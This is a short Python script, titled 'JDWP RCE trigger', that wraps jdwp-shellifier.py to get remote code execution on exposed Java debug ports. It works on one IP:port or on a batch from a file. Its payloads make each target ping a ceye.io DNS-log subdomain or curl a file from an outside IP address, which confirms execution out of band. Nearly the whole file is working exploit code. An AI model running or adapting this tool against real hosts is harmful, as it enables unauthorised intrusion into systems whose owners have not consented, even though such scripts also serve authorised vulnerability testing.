import os
import argparse


def exploit_dnslog(ip, port):
    cmd = "python jdwp-shellifier.py -t {} -p {} --break-on 'java.lang.String.indexOf'".format(ip, port) + \
          " --cmd 'ping {}.8yvuyw.ceye.io'".format(ip)
    print(">> " + cmd)
    os.system(cmd)


def exploit_curl_local_http_server(ip, port):
    cmd = "python jdwp-shellifier.py -t {} -p {} --break-on 'java.lang.String.indexOf'".format(ip, port) + \
          " --cmd 'curl 30.50.98.69:8090/dupei-test.html'"
    print(">> " + cmd)
    os.system(cmd)


def exploit(target, payload):
    ip_port = target.split(':')
    ip = ip_port[0]
    port = ip_port[1]
    if args.payload == 'local_http':
        exploit_curl_local_http_server(ip, port)
    elif args.payload == 'dnslog':
        exploit_dnslog(ip, port)
    else:
        print('Unknown Payload')


def batch_exploit(input, payload):
    with open(input, 'r') as fh:
        for line in fh.readlines():
            ip_port = line.strip().split(':')
            ip = ip_port[0]
            port = ip_port[1]

            if payload == 'local_http':
                exploit_curl_local_http_server(ip, port)
            elif payload == 'dnslog':
                exploit_dnslog(ip, port)
            else:
                print('Unknown Payload')


_examples = """
Example:
  # JDWP RCE trigger
  python %(prog)s ip_list_fpath
"""

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='JDWP RCE trigger',
        epilog=_examples,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('--payload', type=str, default='local_http', help='payload type, dnslog|local_http')
    parser.add_argument('-t', '--target', type=str, help='IP address and port, e.g. 127.0.0.1:8000')
    parser.add_argument('-i', '--input', type=str, help='Input file contains many IP address and port, '
                                                        'e.g. 127.0.0.1:8000')
    args = parser.parse_args()

    if args.target:
        exploit(args.target, args.payload)
    elif args.input:
        batch_exploit(args.input, args.payload)
    else:
        print('unknown parameters!')

